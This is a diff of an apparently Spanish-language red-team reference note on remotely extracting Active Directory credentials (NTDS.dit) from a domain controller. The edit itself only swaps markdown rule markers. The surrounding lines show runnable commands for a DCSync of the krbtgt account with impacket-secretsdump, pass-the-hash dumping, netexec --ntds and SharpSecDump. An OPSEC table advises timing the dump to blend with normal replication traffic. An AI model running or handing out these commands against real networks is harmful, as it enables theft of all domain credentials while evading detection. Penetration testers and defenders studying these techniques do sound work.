@@ -16,7 +16,7 @@ linked:
 ---
 # NTDS.dit Extraction - Remote Extraction
 
-***
+---
 
 ## impacket-secretsdump Live (DCSync)
 
@@ -43,7 +43,7 @@ impacket-secretsdump corp.local/administrator:P@ssw0rd@dc01.corp.local \
   -just-dc-user krbtgt
 ```
 
-___
+---
 
 ## nxc / netexec --ntds
 
@@ -67,7 +67,7 @@ nxc smb dc01.corp.local -u administrator -H aad3b435b51404eeaad3b435b51404ee:5f4
 # Output en nxc log: ~/.nxc/logs/
 ```
 
-___
+---
 
 ## secretsdump con Pass-the-Hash
 
@@ -84,7 +84,7 @@ impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d
   corp.local/administrator@dc01.corp.local -just-dc-ntlm
 ```
 
-___
+---
 
 ## SharpSecDump (.NET Remote)
 
@@ -99,7 +99,7 @@ ___
 .\SharpSecDump.exe -target=dc01.corp.local -u=administrator -p=P@ssw0rd -d=corp.local
 ```
 
-___
+---
 
 ## Requirements
 
@@ -117,7 +117,7 @@ nxc smb dc01.corp.local -u admin -p pass
 # Output: SMB 10.10.10.1 445 DC01 [+] corp.local\admin:pass (Pwn3d!)
 ```
 
-___
+---
 
 ## OPSEC
 
@@ -130,4 +130,4 @@ ___
 | Timing | Durante business hours = blend con replication normal | Off-hours más sospechoso si no hay DCs activos |
 ^ntds-remote-opsec
 
-***
+---
